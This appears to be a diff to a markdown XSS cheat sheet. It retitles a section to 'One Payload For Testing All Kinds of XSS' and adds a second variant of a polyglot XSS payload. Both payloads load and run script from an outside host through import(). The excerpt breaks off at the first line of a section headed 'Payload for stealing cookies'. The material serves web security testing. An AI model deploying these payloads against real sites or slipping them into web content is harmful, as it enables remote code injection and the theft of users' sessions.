@@ -8,14 +8,19 @@
 * [Reflected XSS with some SVG markup allowed](#Reflected-XSS-with-some-SVG-markup-allowed)
 * [Reflected XSS in canonical link tag](#Reflected-XSS-in-canonical-link-tag)
 
-## One Payload
+## One Payload For Testing All Kinds of XSS
 ```
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 <!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
 \74k<K/contentEditable/autoFocus/OnFocus​=
 /*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
 ```
-
+```
+JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
+</Title/<​/Style/<​/Script/</textArea/</iFrame>
+\74k<K/contentEditable/autoFocus/OnFocus​=
+/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76
+```
 ## Payload for stealing cookies
 ```js
 <script>
